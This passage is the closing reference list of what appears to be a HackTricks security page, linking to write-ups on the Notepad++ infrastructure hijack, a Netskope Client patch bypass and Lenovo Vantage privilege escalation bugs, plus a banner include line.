- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
